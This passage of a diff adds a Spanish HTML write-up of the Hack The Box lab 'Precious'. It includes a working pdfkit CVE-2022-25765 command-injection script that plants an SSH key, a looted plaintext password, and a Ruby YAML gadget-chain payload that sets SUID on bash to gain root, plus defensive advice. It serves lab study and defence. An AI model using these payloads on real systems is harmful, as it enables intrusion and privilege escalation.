+          <div class="tl-item">
+            <div class="tl-dot tl-dot-green"></div>
+            <div class="tl-label">User Flag</div>
+            <div class="tl-action">SSH como henry → /home/henry/user.txt</div>
+            <div class="tl-detail" style="color:var(--yellow);font-family:monospace">e56c32c4825c1e8a98b2aeaea206c23f</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot tl-dot-red"></div>
+            <div class="tl-label">Escalada de privilegios</div>
+            <div class="tl-action">sudo ruby → YAML.load gadget chain</div>
+            <div class="tl-detail">chmod u+s /bin/bash → bash -p → euid=root</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot tl-dot-green"></div>
+            <div class="tl-label">Root Flag</div>
+            <div class="tl-action">bash -p -c 'cat /root/root.txt'</div>
+            <div class="tl-detail" style="color:var(--yellow);font-family:monospace">b06bb2c466c58646e796f835cc7db96a</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- EXPLOTACION -->
+      <section id="exploit">
+        <div class="section-header">
+          <div class="section-number">5</div>
+          <div class="section-title">Explotación detallada</div>
+        </div>
+
+        <h2>5.1 — CVE-2022-25765: pdfkit Command Injection</h2>
+
+        <div class="callout callout-info">
+          <strong>¿Cómo funciona la vulnerabilidad?</strong><br>
+          pdfkit convierte URLs a PDFs usando wkhtmltopdf. Para ello construye un comando shell:
+          <code>wkhtmltopdf [opciones] "URL_USUARIO" output.pdf</code>. Si la URL contiene una secuencia con backticks, el shell interpreta el contenido como un subcomando a ejecutar ANTES de que wkhtmltopdf procese la URL.
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 3</span>
+            <span class="step-name">Servidor HTTP de apoyo para validación de URL</span>
+          </div>
+          <div class="why-box"><strong>¿Por qué necesitamos esto?</strong> pdfkit hace una petición HTTP GET a la URL antes de procesarla. Si el servidor no responde con 200 OK, pdfkit rechaza la petición y el payload nunca llega al shell. Montamos un servidor mínimo que siempre devuelve 200.</div>
+          <div class="code-block">
+            <div class="code-label">python3 — servidor HTTP que siempre devuelve 200</div>
+            <div class="code-body">
+<span class="kw">from</span> http.server <span class="kw">import</span> BaseHTTPRequestHandler, HTTPServer<br>
+<br>
+<span class="kw">class</span> <span class="gc-class">AlwaysOK</span>(BaseHTTPRequestHandler):<br>
+&nbsp;&nbsp;<span class="kw">def</span> <span class="cmd">do_GET</span>(self):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(<span class="str">200</span>)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
+&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(<span class="str">b"ok"</span>)<br>
+&nbsp;&nbsp;<span class="kw">def</span> log_message(self, *args): <span class="kw">pass</span>  <span class="comment"># silenciar logs</span><br>
+<br>
+HTTPServer((<span class="str">'0.0.0.0'</span>, <span class="str">8080</span>), AlwaysOK).serve_forever()
+            </div>
+          </div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 4</span>
+            <span class="step-name">Generación de SSH keypair e inyección</span>
+          </div>
+          <div class="why-box"><strong>¿Por qué inyectar SSH key en lugar de reverse shell directa?</strong> El payload viaja URL-encoded, lo que puede corromper caracteres especiales de una reverse shell. Inyectar una clave SSH pública es más robusto y nos da acceso persistente y limpio.</div>
+          <div class="code-block">
+            <div class="code-label">python3 — exploit CVE-2022-25765</div>
+            <div class="code-body">
+<span class="kw">from</span> urllib.parse <span class="kw">import</span> quote<br>
+<span class="kw">import</span> requests<br>
+<br>
+PUB_KEY = <span class="str">"ssh-ed25519 AAAA...clave_publica"</span><br>
+<br>
+<span class="comment"># Comando que inyectamos: crear .ssh y añadir nuestra clave</span><br>
+cmd = <span class="str">f"mkdir -p /home/ruby/.ssh && echo '{PUB_KEY}' >> /home/ruby/.ssh/authorized_keys"</span><br>
+<br>
+<span class="comment"># Formato crítico: http://%20`command`</span><br>
+<span class="comment"># El %20 es un espacio (URL-encoded) que separa el "protocolo" del comando</span><br>
+payload = <span class="str">"http://%20`"</span> + cmd + <span class="str">"`"</span><br>
+<br>
+<span class="comment"># Double-encode: quote() hace que Sinatra decodifique y el shell vea los backticks</span><br>
+encoded = quote(payload, safe=<span class="str">""</span>)<br>
+<br>
+requests.post(<span class="str">"http://precious.htb/"</span>,<br>
+&nbsp;&nbsp;data=<span class="str">"url="</span> + encoded,<br>
+&nbsp;&nbsp;headers={<span class="str">"Content-Type"</span>: <span class="str">"application/x-www-form-urlencoded"</span>}<br>
+)
+            </div>
+          </div>
+          <div class="interpret-box"><strong>¿Por qué <code>quote(payload, safe="")</code>?</strong> Sinatra decodifica la URL una vez al recibirla. Al double-encodear con quote(), el backtick (<code>`</code>) llega al shell ya decodificado (<code>%60</code> → <code>`</code>). Sin double-encoding, el backtick permanece como <code>%2560</code> y el shell no lo interpreta como un subshell.</div>
+          <div class="code-block">
+            <div class="code-label">bash — conexión SSH con clave inyectada</div>
+            <div class="code-body">
+              <span class="cmd">ssh</span> <span class="param">-i</span> /tmp/precious_key <span class="user">ruby</span>@<span class="ip">10.129.228.98</span><br>
+              <span class="success">ruby@precious:~$ id</span><br>
+              <span class="comment">uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)</span>
+            </div>
+          </div>
+        </div>
+
+        <h2>5.2 — Movimiento lateral: ruby → henry</h2>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 5</span>
+            <span class="step-name">Credenciales en ~/.bundle/config</span>
+          </div>
+          <div class="why-box"><strong>¿Qué es ~/.bundle/config?</strong> Bundler (gestor de paquetes Ruby) guarda credenciales de repositorios privados de gems en este fichero en texto plano. Es un punto de loot habitual en máquinas Ruby.</div>
+          <div class="code-block">
+            <div class="code-label">bash</div>
+            <div class="code-body">
+              <span class="cmd">cat</span> <span class="path">~/.bundle/config</span><br>
+              <span class="comment">---</span><br>
+              <span class="highlight">BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"</span>
+            </div>
+          </div>
+          <div class="interpret-box"><strong>Credenciales encontradas:</strong> henry : Q3c1AqGHtoI0aXAYFH — Probamos estas credenciales en SSH.</div>
+          <div class="code-block">
+            <div class="code-label">bash — SSH como henry + user flag</div>
+            <div class="code-body">
+              <span class="cmd">ssh</span> <span class="user">henry</span>@<span class="ip">10.129.228.98</span>  <span class="comment"># password: Q3c1AqGHtoI0aXAYFH</span><br>
+              <span class="cmd">cat</span> <span class="path">/home/henry/user.txt</span><br>
+              <span class="flag-hl">e56c32c4825c1e8a98b2aeaea206c23f</span>
+            </div>
+          </div>
+        </div>
+
+        <h2>5.3 — Escalada de privilegios: henry → root (YAML Deserialization)</h2>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 6</span>
+            <span class="step-name">sudo -l — descubrir vector de privesc</span>
+          </div>
+          <div class="code-block">
+            <div class="code-label">bash</div>
+            <div class="code-body">
+              <span class="cmd">sudo -l</span><br>
+              <span class="highlight">User henry may run the following commands on precious:</span><br>
+              <span class="success">&nbsp;&nbsp;&nbsp;&nbsp;(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb</span>
+            </div>
+          </div>
+          <div class="interpret-box"><strong>Henry puede ejecutar ese script Ruby como root sin contraseña.</strong> Analizamos el script para encontrar el vector.</div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 7</span>
+            <span class="step-name">Análisis de update_dependencies.rb</span>
+          </div>
+          <div class="code-block">
+            <div class="code-label">ruby — código vulnerable</div>
+            <div class="code-body">
+<span class="kw">require</span> <span class="str">"yaml"</span><br>
+<span class="kw">require</span> <span class="str">'rubygems'</span><br>
+<br>
+<span class="kw">def</span> <span class="cmd">list_from_file</span><br>
+&nbsp;&nbsp;<span class="highlight">YAML.load(File.read("dependencies.yml"))</span>  <span class="comment"># ← VULNERABLE: ruta relativa + unsafe load</span><br>
+<span class="kw">end</span>
+            </div>
+          </div>
+          <div class="callout callout-danger">
+            <strong>Dos problemas combinados:</strong><br>
+            1. <code>YAML.load</code> (sin .safe_load) puede instanciar objetos Ruby arbitrarios — permite gadget chains<br>
+            2. <code>File.read("dependencies.yml")</code> usa ruta relativa — henry controla qué fichero se lee desde su directorio
+          </div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 8</span>
+            <span class="step-name">YAML Deserialization Gadget Chain — anatomía</span>
+          </div>
+          <div class="why-box"><strong>¿Cómo funciona el gadget chain?</strong> En lugar de deserializar solo datos (strings, números), <code>YAML.load</code> puede instanciar objetos Ruby. Encadenando objetos de la librería estándar que se llaman mutuamente durante la inicialización, logramos que la deserialización ejecute código arbitrario.</div>
+          <div class="gadget-chain">
+<span class="gc-class">Gem::Requirement</span> <span class="gc-arrow">──</span> <span class="gc-comment">yaml_initialize llama requirements.map!</span><br>
+&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Gem::Package::TarReader</span> <span class="gc-arrow">──</span> <span class="gc-comment">Enumerable: itera entries desde io</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Net::BufferedIO</span> <span class="gc-arrow">──</span> <span class="gc-comment">lee y envía data a debug_output</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Net::WriteAdapter</span> (outer) <span class="gc-arrow">──</span> <span class="gc-comment">debug_output: socket.send(:resolve, data)</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Gem::RequestSet</span>#resolve(data)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">@sets &lt;&lt; data</span>    <span class="gc-comment">← primer call: system(garbage) → false (OK)</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">@sets &lt;&lt; @git_set</span> <span class="gc-comment">← segundo call: system("NUESTRO_COMANDO") ← <span class="gc-exec">EJECUCIÓN!</span></span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Net::WriteAdapter</span> (inner): socket.send(:system, "COMANDO")<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="gc-arrow">→</span> <span class="gc-class">Object</span>.new.send(:system, <span class="gc-exec">"chmod u+s /bin/bash"</span>)
+          </div>
+          <div class="callout callout-warn">
+            <strong>¿Por qué <code>!ruby/object:Object {}</code> en vez de <code>!ruby/proc</code>?</strong><br>
+            En Ruby 2.7.4, el tag YAML <code>!ruby/proc</code> crea un objeto <strong>String</strong>, no un Proc. Al llamar <code>String.send(:call, data)</code> se produce <code>NoMethodError: undefined method 'call' for String</code>. La solución es usar cualquier objeto que incluya <code>Kernel</code> (todos en Ruby) y <code>method_id: :system</code>. El método <code>send</code> bypasea la visibilidad privada de <code>system</code>, por lo que <code>Object.new.send(:system, "cmd")</code> ejecuta el comando.
+          </div>
+        </div>
+
+        <div class="step-box">
+          <div class="step-title">
+            <span class="step-num">PASO 9</span>
+            <span class="step-name">Payload YAML final y ejecución</span>
+          </div>
+          <div class="code-block">
+            <div class="code-label">yaml — dependencies.yml malicioso</div>
+            <div class="code-body">
+---<br>
+- !ruby/object:Gem::Installer<br>
+&nbsp;&nbsp;&nbsp;&nbsp;i: x<br>
+- !ruby/object:Gem::SpecFetcher<br>
+&nbsp;&nbsp;&nbsp;&nbsp;i: x<br>
+- !ruby/object:Gem::Requirement<br>
+&nbsp;&nbsp;requirements:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;!ruby/object:Gem::Package::TarReader<br>
+&nbsp;&nbsp;&nbsp;&nbsp;io: &amp;1 !ruby/object:Net::BufferedIO<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read: 0<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header: "abc"<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;debug_output: &amp;1 !ruby/object:Net::WriteAdapter<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socket: &amp;1 !ruby/object:Gem::RequestSet<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sets: !ruby/object:Net::WriteAdapter<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="highlight">socket: !ruby/object:Object {}</span>  <span class="comment"># ← fix: Object en vez de !ruby/proc</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="highlight">method_id: :system</span>               <span class="comment"># ← fix: system en vez de :call</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="success">git_set: "chmod u+s /bin/bash"</span>   <span class="comment"># ← el comando a ejecutar</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method_id: :resolve
+            </div>
+          </div>
+          <div class="code-block">
+            <div class="code-label">bash — ejecución y root</div>
+            <div class="code-body">
+<span class="comment"># Escribir payload en el directorio de henry</span><br>
+<span class="cmd">cd</span> /home/henry && <span class="cmd">cat</span> > dependencies.yml &lt;&lt; 'EOF'<br>
+[... payload ...] EOF<br>
+<br>
+<span class="comment"># Ejecutar como root</span><br>
+<span class="cmd">sudo</span> /usr/bin/ruby /opt/update_dependencies.rb<br>
+<br>
+<span class="comment"># Verificar SUID en bash</span><br>
+<span class="cmd">ls</span> -la /bin/bash<br>
+<span class="success">-rwsr-xr-x 1 root root 1234376 /bin/bash</span>  <span class="comment">← 's' = SUID activo</span><br>
+<br>
+<span class="comment"># Shell con euid=root</span><br>
+<span class="cmd">bash</span> <span class="param">-p</span> <span class="param">-c</span> <span class="str">'id && cat /root/root.txt'</span><br>
+<span class="success">uid=1000(henry) gid=1000(henry) euid=0(root) groups=1000(henry)</span><br>
+<span class="flag-hl">b06bb2c466c58646e796f835cc7db96a</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- FLAGS -->
+      <section id="flags">
+        <div class="section-header">
+          <div class="section-number">6</div>
+          <div class="section-title">Flags</div>
+        </div>
+        <div class="flag-box">
+          <div class="flag-icon">🚩</div>
+          <div>
+            <div class="flag-label">User Flag — /home/henry/user.txt</div>
+            <div class="flag-val">e56c32c4825c1e8a98b2aeaea206c23f</div>
+          </div>
+        </div>
+        <div class="flag-box" style="border-color:rgba(248,113,113,.3);background:linear-gradient(135deg,rgba(248,113,113,.1),rgba(248,113,113,.05))">
+          <div class="flag-icon">👑</div>
+          <div>
+            <div class="flag-label">Root Flag — /root/root.txt</div>
+            <div class="flag-val">b06bb2c466c58646e796f835cc7db96a</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- RECOMENDACIONES -->
+      <section id="recs">
+        <div class="section-header">
+          <div class="section-number">7</div>
+          <div class="section-title">Recomendaciones defensivas</div>
+        </div>
+        <div class="rec-grid">
+          <div class="rec-card">
+            <div class="rec-badge"><span class="badge badge-red">CRÍTICO</span></div>
+            <div class="rec-title">Actualizar pdfkit a >= 0.8.7</div>
+            <div class="rec-body">pdfkit 0.8.7+ sanitiza correctamente los parámetros de URL. También validar que la URL sea una URL HTTP válida antes de procesarla (regex o URI.parse).</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-badge"><span class="badge badge-red">CRÍTICO</span></div>
+            <div class="rec-title">Usar YAML.safe_load en lugar de YAML.load</div>
+            <div class="rec-body"><code>YAML.safe_load</code> solo permite tipos básicos. Si se necesitan clases específicas: <code>YAML.safe_load(data, permitted_classes: [SpecificClass])</code>.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-badge"><span class="badge badge-yellow">ALTO</span></div>
+            <div class="rec-title">Rutas absolutas en scripts privilegiados</div>
+            <div class="rec-body">Cambiar <code>File.read("dependencies.yml")</code> a <code>File.read("/opt/dependencies.yml")</code> para que el usuario no pueda controlar qué fichero se lee.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-badge"><span class="badge badge-yellow">ALTO</span></div>
+            <div class="rec-title">No almacenar creds en ~/.bundle/config</div>
+            <div class="rec-body">Usar variables de entorno (<code>BUNDLE_RUBYGEMS__ORG</code>) o un vault de secretos. Auditar regularmente ficheros de configuración de cuentas de servicio.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- LECCIONES -->
+      <section id="lessons">
+        <div class="section-header">
+          <div class="section-number">8</div>
+          <div class="section-title">Lecciones aprendidas</div>
+        </div>
+        <h2>Para el atacante</h2>
+        <ul style="color:var(--text-dim);padding-left:20px;margin-bottom:16px">
+          <li style="margin-bottom:8px">Apps web que generan PDFs/imágenes desde URLs → investigar siempre pdfkit/wkhtmltopdf/PhantomJS CVEs</li>
+          <li style="margin-bottom:8px">Post-foothold en Ruby: cat <code>~/.bundle/config</code> siempre — contiene creds en texto plano</li>
+          <li style="margin-bottom:8px"><code>sudo -l</code> es el primer check de privesc en Linux, sin excepciones</li>
+          <li style="margin-bottom:8px">Scripts privilegiados que leen YAML/JSON/YAML con rutas relativas son vectores de deserialization</li>
+          <li style="margin-bottom:8px"><strong>Fix clave para Ruby 2.7.4:</strong> <code>!ruby/proc</code> crea String, no Proc. Usar <code>!ruby/object:Object {}</code> + <code>method_id: :system</code></li>
+        </ul>
+        <h2>Para el defensor</h2>
+        <ul style="color:var(--text-dim);padding-left:20px">
+          <li style="margin-bottom:8px">Monitorizar ejecuciones de wkhtmltopdf con URLs inusuales (backticks, pipes, subshells)</li>
+          <li style="margin-bottom:8px">Grep en código fuente Ruby: <code>YAML\.load\b</code> (sin .safe_) → requiere refactoring urgente</li>
+          <li style="margin-bottom:8px">Scripts sudo deben usar rutas absolutas para todos sus inputs; revisar sudoers regularmente</li>
+          <li style="margin-bottom:8px">IOCs de este ataque: SSH keys inesperadas en ~/.ssh/authorized_keys, bash con SUID, procesos ruby inusuales</li>
+        </ul>
+      </section>
+
+      <!-- GLOSARIO -->
+      <section id="glossary">
+        <div class="section-header">
+          <div class="section-number">9</div>
+          <div class="section-title">Glosario</div>
+        </div>
+        <table class="gloss-table">
+          <tr><th>Término</th><th>Definición</th></tr>
+          <tr><td>pdfkit</td><td>Gema Ruby wrapper de wkhtmltopdf. Convierte URLs/HTML a PDF ejecutando un comando shell.</td></tr>
+          <tr><td>wkhtmltopdf</td><td>Binario que renderiza páginas web en PDF usando QtWebKit. Herramienta legítima usada por pdfkit.</td></tr>
+          <tr><td>CVE-2022-25765</td><td>Command injection en pdfkit v0.8.6 via URL parameter. Permite RCE sin autenticación.</td></tr>
+          <tr><td>Gadget chain</td><td>Secuencia de objetos que, al deserializarse, encadenan llamadas a métodos llevando a RCE. Similar a ROP chains en exploits de memoria.</td></tr>
+          <tr><td>YAML.load</td><td>Método Ruby inseguro que puede instanciar objetos arbitrarios. Usar YAML.safe_load siempre.</td></tr>
+          <tr><td>Sinatra</td><td>Framework web minimalista para Ruby. Similar a Flask para Python.</td></tr>
+          <tr><td>Bundler</td><td>Gestor de dependencias Ruby. Almacena creds de repos privados en ~/.bundle/config.</td></tr>
+          <tr><td>SUID</td><td>Set User ID. Bit que permite ejecutar un binario con los privilegios de su propietario (root si es root).</td></tr>
+          <tr><td>send()</td><td>Método Ruby que llama a cualquier método por nombre, incluyendo privados. Bypasea visibility.</td></tr>
+          <tr><td>double-encoding</td><td>Codificar una URL ya URL-encoded, para que el servidor la decodifique en dos pasos.</td></tr>
+        </table>
+      </section>
+
+    </div><!-- /main -->
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+      <div class="sidebar-card">
+        <div class="sidebar-title">Target Info</div>
+        <div class="info-row"><span class="info-key">IP</span><span class="info-val">10.129.228.98</span></div>
+        <div class="info-row"><span class="info-key">OS</span><span class="info-val">Debian Linux</span></div>
+        <div class="info-row"><span class="info-key">Web</span><span class="info-val">nginx 1.18.0</span></div>
+        <div class="info-row"><span class="info-key">App</span><span class="info-val">Ruby/Sinatra</span></div>
+        <div class="info-row"><span class="info-key">pdfkit</span><span class="info-val">0.8.6 (vuln)</span></div>
+        <div class="info-row"><span class="info-key">Ruby</span><span class="info-val">2.7.4</span></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Credenciales</div>
+        <div class="info-row"><span class="info-key">ruby</span><span class="info-val">SSH key</span></div>
+        <div class="info-row"><span class="info-key">henry</span><span class="info-val">Q3c1AqGH...</span></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Herramientas</div>
+        <div class="info-row"><span class="info-key">nmap</span><span class="info-val">recon</span></div>
+        <div class="info-row"><span class="info-key">whatweb</span><span class="info-val">fingerprint</span></div>
+        <div class="info-row"><span class="info-key">python3</span><span class="info-val">exploit + server</span></div>
+        <div class="info-row"><span class="info-key">ssh-keygen</span><span class="info-val">keypair</span></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Tabla de contenidos</div>
+        <div class="toc-item"><a href="#desc">1. Descripción</a></div>
+        <div class="toc-item"><a href="#recon">2. Reconocimiento</a></div>
+        <div class="toc-item"><a href="#vulns">3. Vulnerabilidades</a></div>
+        <div class="toc-item"><a href="#timeline">4. Timeline</a></div>
+        <div class="toc-item"><a href="#exploit">5. Explotación</a></div>
+        <div class="toc-item"><a href="#flags">6. Flags</a></div>
+        <div class="toc-item"><a href="#recs">7. Recomendaciones</a></div>
+        <div class="toc-item"><a href="#lessons">8. Lecciones</a></div>
+        <div class="toc-item"><a href="#glossary">9. Glosario</a></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">MITRE ATT&CK</div>
+        <div class="mitre-item"><div class="mitre-id">T1190</div><div class="mitre-name">Exploit Public-Facing App</div></div>
+        <div class="mitre-item"><div class="mitre-id">T1059.004</div><div class="mitre-name">Unix Shell Execution</div></div>
+        <div class="mitre-item"><div class="mitre-id">T1552.001</div><div class="mitre-name">Credentials in Files</div></div>
+        <div class="mitre-item"><div class="mitre-id">T1548.003</div><div class="mitre-name">Sudo Abuse</div></div>
+        <div class="mitre-item"><div class="mitre-id">T1502</div><div class="mitre-name">Deserialization RCE</div></div>
+        <div class="mitre-item"><div class="mitre-id">T1548.001</div><div class="mitre-name">Setuid/Setgid</div></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Flags</div>
+        <div style="margin-bottom:10px">
+          <div style="font-size:11px;color:var(--text-muted);margin-bottom:3px">USER</div>
+          <div style="font-family:monospace;font-size:11px;color:var(--yellow);word-break:break-all">e56c32c4825c1e8a98b2aeaea206c23f</div>
+        </div>
+        <div>
+          <div style="font-size:11px;color:var(--text-muted);margin-bottom:3px">ROOT</div>
+          <div style="font-family:monospace;font-size:11px;color:var(--red);word-break:break-all">b06bb2c466c58646e796f835cc7db96a</div>
+        </div>
+      </div>
+    </div><!-- /sidebar -->
+  </div><!-- /grid -->
+</div><!-- /container -->
+
+<footer>
+  Reporte generado por <strong>Ghost-Ops Framework</strong> · HTB Precious · 2026-03-20
+</footer>
+
+</body>
+</html>
